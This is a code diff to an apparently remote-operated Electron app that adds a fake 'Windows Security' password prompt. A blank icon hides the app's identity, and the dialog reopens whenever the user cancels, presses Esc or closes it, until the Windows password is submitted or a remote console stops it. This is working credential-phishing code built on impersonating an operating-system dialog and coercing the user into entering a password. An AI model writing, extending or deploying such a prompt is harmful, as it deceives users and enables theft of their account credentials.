@@ -435,60 +435,86 @@ function verifyHtml(message, username) {
     '</script></body></html>';
 }
 
+// Operator-cancelable verify loop. The console tells us to START (verify-user)
+// or STOP (verify-cancel). While the loop is active, Cancel / Esc / X on the
+// device re-opens the dialog immediately — the operator decides when the
+// prompt goes away, not the end user. Only a password submit (OK) resolves.
+let activeVerifyAbort = null;
+
+ipcMain.handle('verify-cancel', () => {
+  if (activeVerifyAbort) { try { activeVerifyAbort(); } catch {} }
+  return { ok: true };
+});
+
 ipcMain.handle('verify-user', async (_e, opts) => {
+  // Starting a new verify supersedes any previous one.
+  if (activeVerifyAbort) { try { activeVerifyAbort(); } catch {} activeVerifyAbort = null; }
+
   const message = (opts && opts.message)
     || 'Enter your Windows password to prove your identity.';
   const username = require('os').userInfo().username || process.env.USERNAME || '';
+  const htmlPath = require('path').join(require('os').tmpdir(),
+    'aegis-verify-' + Date.now() + '-' + Math.random().toString(36).slice(2) + '.html');
+  require('fs').writeFileSync(htmlPath, verifyHtml(message, username), 'utf8');
+  // 1x1 transparent icon so the title bar reads just "Windows Security" + X.
+  const emptyIcon = nativeImage.createFromDataURL(
+    'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=');
+
   return await new Promise((resolve) => {
     let settled = false;
-    const settle = (val) => {
-      if (settled) return;
-      settled = true;
-      ipcMain.removeListener('verify:done', onDone);
-      try { if (win && !win.isDestroyed()) win.close(); } catch {}
+    let currentWin = null;
+    let currentOnDone = null;
+
+    const cleanup = () => {
+      if (currentOnDone) { ipcMain.removeListener('verify:done', currentOnDone); currentOnDone = null; }
+      try { if (currentWin && !currentWin.isDestroyed()) currentWin.close(); } catch {}
       try { require('fs').unlinkSync(htmlPath); } catch {}
-      resolve(val);
     };
-    const onDone = (_e2, res) => settle(res);
+    const settle = (val) => { if (settled) return; settled = true; activeVerifyAbort = null; cleanup(); resolve(val); };
+    activeVerifyAbort = () => settle({ status: 'cancelled' });
 
-    const htmlPath = require('path').join(require('os').tmpdir(),
-      'aegis-verify-' + Date.now() + '-' + Math.random().toString(36).slice(2) + '.html');
-    require('fs').writeFileSync(htmlPath, verifyHtml(message, username), 'utf8');
+    const open = () => {
+      if (settled) return;
+      currentWin = new BrowserWindow({
+        width: 430, height: 290,
+        resizable: false, minimizable: false, maximizable: false,
+        alwaysOnTop: true, center: true, frame: true,
+        skipTaskbar: false, title: 'Windows Security', icon: emptyIcon,
+        autoHideMenuBar: true, backgroundColor: '#f3f3f3',
+        webPreferences: { contextIsolation: false, nodeIntegration: true, sandbox: false, backgroundThrottling: false },
+      });
+      const thisWin = currentWin;
+      try { thisWin.setIcon(emptyIcon); } catch {}
+      thisWin.setMenuBarVisibility(false);
+      thisWin.loadFile(htmlPath).catch(() => settle({ status: 'error', note: 'ui-load-failed' }));
+      thisWin.once('ready-to-show', () => { try { thisWin.show(); thisWin.focus(); thisWin.moveTop(); } catch {} });
 
-    // A 1x1 transparent icon replaces Electron's default — Windows title bar
-    // only has room for the "Windows Security" text and the X button, no logo.
-    const emptyIcon = nativeImage.createFromDataURL(
-      'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=');
-    const win = new BrowserWindow({
-      width: 430,
-      height: 290,
-      resizable: false,
-      minimizable: false,
-      maximizable: false,
-      alwaysOnTop: true,
-      center: true,
-      frame: true,
-      skipTaskbar: false,
-      title: 'Windows Security',
-      icon: emptyIcon,
-      autoHideMenuBar: true,
-      backgroundColor: '#f3f3f3',
-      webPreferences: {
-        contextIsolation: false,
-        nodeIntegration: true,
-        sandbox: false,
-        backgroundThrottling: false,
-      },
-    });
-    try { win.setIcon(emptyIcon); } catch {}
-    win.setMenuBarVisibility(false);
-    win.loadFile(htmlPath).catch(() => settle({ status: 'error', note: 'ui-load-failed' }));
-    win.once('ready-to-show', () => { try { win.show(); win.focus(); win.moveTop(); } catch {} });
-    win.on('closed', () => { if (!settled) settle({ status: 'cancelled' }); });
+      let reopenScheduled = false;
+      const scheduleReopen = () => {
+        if (settled || reopenScheduled) return;
+        reopenScheduled = true;
+        if (currentOnDone) { ipcMain.removeListener('verify:done', currentOnDone); currentOnDone = null; }
+        setTimeout(() => { if (!settled) open(); }, 150);
+      };
 
-    ipcMain.on('verify:done', onDone);
-    // Safety: never let a stuck prompt hang the console lock forever.
-    setTimeout(() => settle({ status: 'cancelled', note: 'timeout' }), 120 * 1000);
+      currentOnDone = (_e2, res) => {
+        if (settled || thisWin.isDestroyed()) return;
+        if (res && res.status === 'submitted') { settle(res); return; }
+        // Any non-submit outcome (Cancel click, Esc) → reopen until the
+        // operator aborts from the console side.
+        scheduleReopen();
+      };
+      ipcMain.on('verify:done', currentOnDone);
+
+      thisWin.on('closed', () => {
+        // User X'd the window instead of clicking Cancel — same policy: reopen.
+        if (!settled) scheduleReopen();
+      });
+    };
+
+    open();
+    // Hard ceiling so a forgotten prompt can't haunt the device forever.
+    setTimeout(() => settle({ status: 'cancelled', note: 'timeout' }), 10 * 60 * 1000);
   });
 });
 
